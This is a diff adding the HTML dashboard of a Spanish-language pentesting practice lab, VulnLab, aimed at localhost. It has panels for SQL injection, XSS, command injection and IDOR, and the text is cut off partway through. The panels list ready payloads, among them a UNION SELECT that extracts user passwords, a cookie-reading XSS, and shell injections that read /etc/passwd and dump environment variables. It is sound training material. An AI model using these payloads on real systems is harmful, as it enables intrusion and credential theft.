@@ -1,0 +1,1659 @@
+<!DOCTYPE html>
+<html lang="es" class="h-full">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VulnLab — Dashboard</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+  /* Terminal colors – injected by JS */
+  .t-prompt { color: #34d399; }
+  .t-cmd    { color: #e4e4e7; }
+  .t-out    { color: #a1a1aa; }
+  .t-ok     { color: #34d399; }
+  .t-err    { color: #f87171; }
+  .t-warn   { color: #fbbf24; }
+  .t-info   { color: #60a5fa; }
+  .t-flag   { color: #c084fc; font-weight: 600; }
+  .t-muted  { color: #52525b; }
+  .code-200 { color: #34d399; }
+  .code-401 { color: #fbbf24; }
+  .code-500 { color: #f87171; }
+
+  /* Panel system */
+  .panel { display: none; width: 100%; }
+  .panel.active { display: flex; flex-direction: column; overflow: hidden; }
+
+  /* Nav links */
+  nav a {
+    display: flex; align-items: center; gap: 8px;
+    padding: 6px 16px; font-size: 12px;
+    color: #a1a1aa; text-decoration: none;
+    border-left: 2px solid transparent;
+    transition: all .12s;
+  }
+  nav a:hover { background: #27272a; color: #e4e4e7; }
+  nav a.active { background: #27272a; border-left-color: #34d399; color: #34d399; }
+
+  /* Status dot */
+  .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; background: #52525b; }
+  .dot.online  { background: #34d399; box-shadow: 0 0 6px #34d399; }
+  .dot.offline { background: #f87171; }
+
+  /* HTTP tabs */
+  .http-tab { padding: 6px 14px; font-size: 11px; color: #71717a; cursor: pointer; border-bottom: 2px solid transparent; }
+  .http-tab.active { color: #60a5fa; border-bottom-color: #60a5fa; }
+
+  /* Terminal empty placeholder */
+  [id^="term-"]:empty::before { content: "$ esperando acción..."; color: #3f3f46; }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 4px; height: 4px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: #3f3f46; border-radius: 2px; }
+
+  /* Input focus */
+  input:focus, select:focus, textarea:focus { outline: none; border-color: #60a5fa !important; }
+
+  body { font-family: ui-sans-serif, system-ui, sans-serif; }
+</style>
+</head>
+<body class="bg-zinc-950 text-zinc-200 h-screen flex overflow-hidden text-sm">
+
+<!-- ═══════════════ SIDEBAR ═══════════════ -->
+<aside class="w-52 min-w-[208px] bg-zinc-900 border-r border-zinc-800 flex flex-col overflow-hidden">
+
+  <div class="px-4 py-4 border-b border-zinc-800">
+    <h1 class="text-emerald-400 font-mono font-semibold tracking-widest text-sm">[ VulnLab ]</h1>
+    <p class="text-zinc-600 text-xs mt-0.5">Pentesting · OWASP Top 10</p>
+  </div>
+
+  <div class="px-4 py-2 border-b border-zinc-800 flex items-center gap-2 text-xs">
+    <div class="dot" id="status-dot"></div>
+    <span id="status-text" class="text-zinc-500 truncate">Verificando...</span>
+  </div>
+
+  <nav class="flex-1 overflow-y-auto py-2">
+    <div class="px-4 pt-3 pb-1 text-[10px] text-zinc-600 uppercase tracking-widest">General</div>
+    <a href="#" class="active" onclick="show('overview')">
+      <span class="text-zinc-600">◆</span> Overview
+    </a>
+    <a href="#" onclick="show('scanner')">
+      <span class="text-zinc-600">▶</span> Full Scanner
+    </a>
+
+    <div class="px-4 pt-4 pb-1 text-[10px] text-zinc-600 uppercase tracking-widest">Módulos</div>
+    <a href="#" onclick="show('sqli')">
+      <span class="text-red-500 text-[10px]">■</span> SQL Injection
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-red-950 text-red-400 font-bold">CRÍTICO</span>
+    </a>
+    <a href="#" onclick="show('xss')">
+      <span class="text-orange-500 text-[10px]">■</span> XSS
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-orange-950 text-orange-400 font-bold">ALTO</span>
+    </a>
+    <a href="#" onclick="show('cmdi')">
+      <span class="text-red-500 text-[10px]">■</span> Command Injection
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-red-950 text-red-400 font-bold">CRÍTICO</span>
+    </a>
+    <a href="#" onclick="show('idor')">
+      <span class="text-orange-500 text-[10px]">■</span> IDOR
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-orange-950 text-orange-400 font-bold">ALTO</span>
+    </a>
+    <a href="#" onclick="show('infodisclosure')">
+      <span class="text-red-500 text-[10px]">■</span> Info Disclosure
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-red-950 text-red-400 font-bold">CRÍTICO</span>
+    </a>
+    <a href="#" onclick="show('api')">
+      <span class="text-orange-500 text-[10px]">■</span> Broken Auth
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-orange-950 text-orange-400 font-bold">ALTO</span>
+    </a>
+
+    <div class="px-4 pt-4 pb-1 text-[10px] text-zinc-600 uppercase tracking-widest">Avanzado</div>
+    <a href="#" onclick="show('upload')">
+      <span class="text-amber-500 text-[10px]">■</span> File Upload
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-amber-950 text-amber-400 font-bold">A05</span>
+    </a>
+    <a href="#" onclick="show('deserialize')">
+      <span class="text-red-500 text-[10px]">■</span> Deserialización
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-red-950 text-red-400 font-bold">CRÍTICO</span>
+    </a>
+    <a href="#" onclick="show('logging')">
+      <span class="text-orange-500 text-[10px]">■</span> Sin Logging
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-orange-950 text-orange-400 font-bold">A09</span>
+    </a>
+    <a href="#" onclick="show('ssrf')">
+      <span class="text-orange-500 text-[10px]">■</span> SSRF
+      <span class="ml-auto text-[9px] px-1.5 py-0.5 rounded bg-orange-950 text-orange-400 font-bold">A10</span>
+    </a>
+
+    <div class="px-4 pt-4 pb-1 text-[10px] text-zinc-600 uppercase tracking-widest">Herramientas</div>
+    <a href="#" onclick="show('headers')">
+      <span class="text-sky-600 text-[10px]">■</span> HTTP Headers
+    </a>
+    <a href="#" onclick="show('portscanner')">
+      <span class="text-sky-600 text-[10px]">■</span> Port Scanner
+    </a>
+  </nav>
+
+  <div class="px-4 py-3 border-t border-zinc-800 text-[10px] text-zinc-600 leading-relaxed">
+    ⚠ Solo uso educativo<br>Entorno local controlado
+  </div>
+</aside>
+
+<!-- ═══════════════ MAIN ═══════════════ -->
+<div id="main" class="flex-1 flex flex-col overflow-hidden">
+
+  <div class="px-5 py-3 border-b border-zinc-800 bg-zinc-900 flex items-center gap-3 flex-shrink-0">
+    <h2 id="panel-title" class="text-zinc-100 font-medium flex-1">Overview</h2>
+    <span id="target-url" class="text-sky-400 text-xs font-mono">http://localhost:8080</span>
+  </div>
+
+  <div id="content" class="flex-1 overflow-hidden">
+
+    <!-- ── OVERVIEW ────────────────────────── -->
+    <div class="panel active" id="p-overview">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <h2 class="text-lg font-semibold text-zinc-100 mb-1">Dashboard de Vulnerabilidades</h2>
+        <p class="text-zinc-500 text-xs mb-6">Selecciona un módulo en el sidebar para comenzar a practicar.</p>
+
+        <div class="grid grid-cols-4 gap-3 mb-6">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 text-center">
+            <div id="ov-crit" class="text-3xl font-bold text-red-400 tabular-nums">—</div>
+            <div class="text-[10px] text-zinc-600 mt-1 uppercase tracking-wider">Crítico</div>
+          </div>
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 text-center">
+            <div id="ov-high" class="text-3xl font-bold text-orange-400 tabular-nums">—</div>
+            <div class="text-[10px] text-zinc-600 mt-1 uppercase tracking-wider">Alto</div>
+          </div>
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 text-center">
+            <div id="ov-med" class="text-3xl font-bold text-amber-400 tabular-nums">—</div>
+            <div class="text-[10px] text-zinc-600 mt-1 uppercase tracking-wider">Medio</div>
+          </div>
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 text-center">
+            <div id="ov-info" class="text-3xl font-bold text-sky-400 tabular-nums">—</div>
+            <div class="text-[10px] text-zinc-600 mt-1 uppercase tracking-wider">Info</div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 mb-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Mapa de vulnerabilidades</h3>
+          <table class="w-full text-xs">
+            <thead><tr class="border-b border-zinc-800">
+              <th class="text-left pb-2 text-zinc-500 font-normal">Endpoint</th>
+              <th class="text-left pb-2 text-zinc-500 font-normal">Vulnerabilidad</th>
+              <th class="text-left pb-2 text-zinc-500 font-normal">OWASP</th>
+              <th class="text-left pb-2 text-zinc-500 font-normal">Severidad</th>
+              <th class="text-left pb-2 text-zinc-500 font-normal">Estado</th>
+            </tr></thead>
+            <tbody class="divide-y divide-zinc-800/40">
+              <tr class="hover:bg-zinc-800/30 transition-colors">
+                <td class="py-2.5 font-mono text-zinc-300">/login</td>
+                <td class="py-2.5 text-zinc-400">SQL Injection</td>
+                <td class="py-2.5 text-zinc-600">A03:2021</td>
+                <td class="py-2.5"><span class="px-1.5 py-0.5 rounded text-[10px] bg-red-950 text-red-400 font-bold">CRÍTICO</span></td>
+                <td class="py-2.5"><span id="ov-status-sqli" class="text-zinc-600">—</span></td>
+              </tr>
+              <tr class="hover:bg-zinc-800/30 transition-colors">
+                <td class="py-2.5 font-mono text-zinc-300">/search</td>
+                <td class="py-2.5 text-zinc-400">XSS Reflejado</td>
+                <td class="py-2.5 text-zinc-600">A03:2021</td>
+                <td class="py-2.5"><span class="px-1.5 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold">ALTO</span></td>
+                <td class="py-2.5"><span id="ov-status-xss" class="text-zinc-600">—</span></td>
+              </tr>
+              <tr class="hover:bg-zinc-800/30 transition-colors">
+                <td class="py-2.5 font-mono text-zinc-300">/ping</td>
+                <td class="py-2.5 text-zinc-400">Command Injection</td>
+                <td class="py-2.5 text-zinc-600">A03:2021</td>
+                <td class="py-2.5"><span class="px-1.5 py-0.5 rounded text-[10px] bg-red-950 text-red-400 font-bold">CRÍTICO</span></td>
+                <td class="py-2.5"><span id="ov-status-cmdi" class="text-zinc-600">—</span></td>
+              </tr>
+              <tr class="hover:bg-zinc-800/30 transition-colors">
+                <td class="py-2.5 font-mono text-zinc-300">/notes</td>
+                <td class="py-2.5 text-zinc-400">IDOR</td>
+                <td class="py-2.5 text-zinc-600">A01:2021</td>
+                <td class="py-2.5"><span class="px-1.5 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold">ALTO</span></td>
+                <td class="py-2.5"><span id="ov-status-idor" class="text-zinc-600">—</span></td>
+              </tr>
+              <tr class="hover:bg-zinc-800/30 transition-colors">
+                <td class="py-2.5 font-mono text-zinc-300">/info</td>
+                <td class="py-2.5 text-zinc-400">Info Disclosure</td>
+                <td class="py-2.5 text-zinc-600">A05:2021</td>
+                <td class="py-2.5"><span class="px-1.5 py-0.5 rounded text-[10px] bg-red-950 text-red-400 font-bold">CRÍTICO</span></td>
+                <td class="py-2.5"><span id="ov-status-info" class="text-zinc-600">—</span></td>
+              </tr>
+              <tr class="hover:bg-zinc-800/30 transition-colors">
+                <td class="py-2.5 font-mono text-zinc-300">/api/users</td>
+                <td class="py-2.5 text-zinc-400">Broken Auth</td>
+                <td class="py-2.5 text-zinc-600">A07:2021</td>
+                <td class="py-2.5"><span class="px-1.5 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold">ALTO</span></td>
+                <td class="py-2.5"><span id="ov-status-api" class="text-zinc-600">—</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Inicio rápido</h3>
+          <ol class="text-xs text-zinc-400 space-y-2 leading-relaxed">
+            <li>1. Haz clic en <span class="text-emerald-400 font-medium">Full Scanner</span> para detectar todas las vulnerabilidades automáticamente.</li>
+            <li>2. Abre cada módulo del sidebar para explorar y explotar las vulnerabilidades de forma interactiva.</li>
+            <li>3. Usa los scripts en <code class="text-sky-400 font-mono">pentesting_scripts/</code> desde la terminal.</li>
+            <li>4. Busca las tres flags ocultas: <span class="text-purple-400 font-mono">FLAG{...}</span></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── FULL SCANNER ──────────────────── -->
+    <div class="panel" id="p-scanner">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">Escáner Completo</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-sky-950 text-sky-400 font-bold border border-sky-900/50">AUTO</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-6">Ejecuta todos los módulos de detección en secuencia.</p>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 mb-4">
+          <div class="flex items-center gap-3 mb-3">
+            <button id="btn-fullscan" onclick="runFullScan()"
+              class="px-3 py-1.5 bg-emerald-950 border border-emerald-800 text-emerald-400 rounded-lg text-xs font-medium hover:bg-emerald-900 transition-colors disabled:opacity-40 disabled:cursor-not-allowed">
+              ▶ Iniciar escaneo
+            </button>
+            <span id="scan-status" class="text-zinc-500 text-xs">Listo</span>
+          </div>
+          <div class="h-0.5 bg-zinc-800 rounded-full overflow-hidden mb-2">
+            <div id="scan-bar" class="h-full bg-emerald-400 transition-all duration-300" style="width:0%"></div>
+          </div>
+          <div id="scan-step" class="text-[10px] text-zinc-600 font-mono">—</div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">recon_output</span>
+            <button onclick="clearTerm('term-scan')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-scan" class="p-4 min-h-32 max-h-80 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── SQL INJECTION ─────────────────── -->
+    <div class="panel" id="p-sqli">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">SQL Injection</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-red-950 text-red-400 font-bold border border-red-900/50">CRÍTICO · A03:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">Inyección de código SQL en campos sin sanitizar.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Cómo funciona?</strong> La app concatena directamente el input a la query SQL.
+          <code class="text-sky-400">' OR '1'='1</code> rompe la lógica y autentica sin credenciales válidas.
+          Con <strong class="text-zinc-300">UNION SELECT</strong> se extrae la BD completa.
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Login Bypass — /login</h3>
+            <div class="space-y-3">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Payload usuario</label>
+                <select id="sqli-payload" onchange="updateSqliInput()"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+                  <option value="' OR '1'='1">Básico: ' OR '1'='1</option>
+                  <option value="' OR 1=1--">Comentario: ' OR 1=1--</option>
+                  <option value="admin'--">Admin bypass: admin'--</option>
+                  <option value="' OR 'x'='x">Alternativo: ' OR 'x'='x</option>
+                </select>
+              </div>
+              <div class="flex gap-2">
+                <div class="flex-1">
+                  <label class="text-[10px] text-zinc-600 uppercase">Usuario</label>
+                  <input type="text" id="sqli-user" value="' OR '1'='1"
+                    class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+                </div>
+                <div class="flex-1">
+                  <label class="text-[10px] text-zinc-600 uppercase">Password</label>
+                  <input type="password" id="sqli-pass" value="cualquiera"
+                    class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+                </div>
+              </div>
+              <button onclick="testSqliLogin()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Ejecutar
+              </button>
+            </div>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">UNION Extraction — /search</h3>
+            <div class="space-y-3">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Payload búsqueda</label>
+                <select id="sqli-search-payload" onchange="updateSqliSearch()"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+                  <option value="' UNION SELECT 1,username,password,role,email FROM users--">UNION: extraer usuarios</option>
+                  <option value="' OR '1'='1">OR: todos los registros</option>
+                  <option value="' AND 1=2--">Blind: sin resultados</option>
+                </select>
+              </div>
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Query</label>
+                <input type="text" id="sqli-search-input" value="' UNION SELECT 1,username,password,role,email FROM users--"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <button onclick="testSqliSearch()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Ejecutar
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">sqli_output</span>
+            <button onclick="clearTerm('term-sqli')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-sqli" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+
+        <div id="sqli-http" style="display:none" class="mt-3 bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="flex border-b border-zinc-800">
+            <div class="http-tab active" onclick="switchTab(this,'sqli-req')">Request</div>
+            <div class="http-tab" onclick="switchTab(this,'sqli-res')">Response</div>
+          </div>
+          <div id="sqli-req" class="p-3 text-xs font-mono"></div>
+          <div id="sqli-res" class="p-3 text-xs font-mono" style="display:none"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── XSS ──────────────────────────── -->
+    <div class="panel" id="p-xss">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">Cross-Site Scripting</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold border border-orange-900/50">ALTO · A03:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">Inyección de JavaScript en respuestas HTML sin escapar.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Cómo funciona?</strong> El endpoint <code class="text-sky-400">/search</code> usa el filtro <code class="text-sky-400">|safe</code> de Jinja2, desactivando el escape HTML. Cualquier script enviado en <code class="text-sky-400">?q=</code> lo ejecuta el navegador de la víctima.
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Test XSS — /search?q=</h3>
+            <div class="space-y-3">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Payload</label>
+                <select onchange="document.getElementById('xss-input').value=this.value"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+                  <option value="<script>alert(1)</script>">&lt;script&gt;alert(1)&lt;/script&gt;</option>
+                  <option value="<img src=x onerror=alert(document.cookie)>">&lt;img onerror&gt; + cookie</option>
+                  <option value="<svg onload=alert('XSS')>">&lt;svg onload&gt;</option>
+                  <option value='"><script>alert(1)</script>'>Escape de atributo</option>
+                </select>
+              </div>
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Payload a enviar</label>
+                <input type="text" id="xss-input" value="<script>alert(1)</script>"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <button onclick="testXss()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Detectar
+              </button>
+            </div>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Abrir en navegador</h3>
+            <p class="text-xs text-zinc-500 mb-4 leading-relaxed">El escáner detecta si el payload aparece sin encodear. Para ver la alerta real, ábrelo en el navegador.</p>
+            <button onclick="openXssInBrowser()"
+              class="px-3 py-1.5 bg-sky-950 border border-sky-800 text-sky-400 rounded-lg text-xs hover:bg-sky-900 transition-colors">
+              ⊕ Abrir en navegador
+            </button>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">xss_output</span>
+            <button onclick="clearTerm('term-xss')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-xss" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── COMMAND INJECTION ─────────────── -->
+    <div class="panel" id="p-cmdi">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">Command Injection</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-red-950 text-red-400 font-bold border border-red-900/50">CRÍTICO · A03:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">Ejecución de comandos del SO mediante input no sanitizado.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Cómo funciona?</strong> El endpoint <code class="text-sky-400">/ping</code> ejecuta <code class="text-sky-400">ping -c 1 {host}</code> con <code class="text-sky-400">shell=True</code>. Los operadores <code class="text-sky-400">;</code> <code class="text-sky-400">&&</code> <code class="text-sky-400">|</code> permiten encadenar comandos arbitrarios con acceso RCE completo.
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-4">
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Test CMDi — /ping</h3>
+            <div class="space-y-3">
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Payload</label>
+                <select onchange="document.getElementById('cmdi-input').value=this.value"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+                  <option value="127.0.0.1; id">Normal + ; id</option>
+                  <option value="127.0.0.1 && whoami">Normal + && whoami</option>
+                  <option value="127.0.0.1 | cat /etc/passwd">Pipe /etc/passwd</option>
+                  <option value="127.0.0.1; cat /flag.txt">Leer flag.txt</option>
+                  <option value="127.0.0.1; ls /tmp">Listar /tmp</option>
+                  <option value="127.0.0.1; env">Variables de entorno</option>
+                </select>
+              </div>
+              <div>
+                <label class="text-[10px] text-zinc-600 uppercase">Host / payload</label>
+                <input type="text" id="cmdi-input" value="127.0.0.1; id"
+                  class="w-full mt-1 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono">
+              </div>
+              <button onclick="testCmdi()"
+                class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+                ▶ Ejecutar
+              </button>
+            </div>
+          </div>
+
+          <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
+            <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Prevención</h3>
+            <div class="space-y-2 text-xs font-mono text-zinc-400 leading-relaxed">
+              <div><span class="text-red-400">✗</span> subprocess.run(f"ping {'{host}'}", shell=True)</div>
+              <div><span class="text-emerald-400">✓</span> subprocess.run(["ping","-c","1", host])</div>
+              <div><span class="text-emerald-400">✓</span> Validar host con regex <span class="text-sky-400">^[\d.]+$</span></div>
+              <div><span class="text-emerald-400">✓</span> Lista blanca de hosts permitidos</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">cmdi_output — RCE en servidor</span>
+            <button onclick="clearTerm('term-cmdi')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-cmdi" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── IDOR ──────────────────────────── -->
+    <div class="panel" id="p-idor">
+      <div class="flex-1 overflow-y-auto p-6 max-w-4xl">
+        <div class="flex items-center gap-3 mb-1">
+          <h2 class="text-lg font-semibold text-zinc-100">IDOR</h2>
+          <span class="px-2 py-0.5 rounded text-[10px] bg-orange-950 text-orange-400 font-bold border border-orange-900/50">ALTO · A01:2021</span>
+        </div>
+        <p class="text-zinc-500 text-xs mb-4">Acceso a recursos de otros usuarios modificando IDs en la URL.</p>
+
+        <div class="border-l-2 border-sky-700 bg-zinc-900 border border-zinc-800 rounded-r-xl p-3 mb-4 text-xs text-zinc-400 leading-relaxed">
+          <strong class="text-zinc-200">¿Cómo funciona?</strong> El endpoint <code class="text-sky-400">/notes?id=N</code> devuelve la nota sin verificar si el usuario autenticado es el dueño. Cambiar el número expone notas privadas de cualquier usuario incluyendo datos del admin.
+        </div>
+
+        <div class="bg-zinc-900 border border-zinc-800 rounded-xl p-4 mb-4">
+          <h3 class="text-[10px] text-zinc-600 uppercase tracking-wider mb-3">Enumeración — /notes?id=N</h3>
+          <div class="flex gap-3 items-end">
+            <div>
+              <label class="text-[10px] text-zinc-600 uppercase">ID inicial</label>
+              <input type="text" id="idor-start" value="1"
+                class="block mt-1 w-16 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono text-center">
+            </div>
+            <div>
+              <label class="text-[10px] text-zinc-600 uppercase">ID final</label>
+              <input type="text" id="idor-end" value="5"
+                class="block mt-1 w-16 bg-zinc-800 border border-zinc-700 rounded-lg px-2 py-1.5 text-xs text-zinc-200 font-mono text-center">
+            </div>
+            <button onclick="testIdor()"
+              class="px-3 py-1.5 bg-red-950 border border-red-800 text-red-400 rounded-lg text-xs hover:bg-red-900 transition-colors">
+              ▶ Enumerar
+            </button>
+          </div>
+        </div>
+
+        <div class="bg-zinc-950 border border-zinc-800 rounded-xl overflow-hidden">
+          <div class="bg-zinc-900/80 px-3 py-2 flex items-center gap-1.5 border-b border-zinc-800">
+            <div class="w-2.5 h-2.5 rounded-full bg-red-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-amber-500/60"></div>
+            <div class="w-2.5 h-2.5 rounded-full bg-emerald-500/60"></div>
+            <span class="text-[10px] text-zinc-600 flex-1 ml-2 font-mono">idor_output</span>
+            <button onclick="clearTerm('term-idor')" class="text-[10px] text-zinc-600 hover:text-zinc-400 transition-colors">limpiar</button>
+          </div>
+          <div id="term-idor" class="p-4 min-h-28 max-h-64 overflow-y-auto text-xs font-mono leading-relaxed"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── INFO DISCLOSURE ───────────────── -->
+    <div class="panel" id="p-infodisclosure">
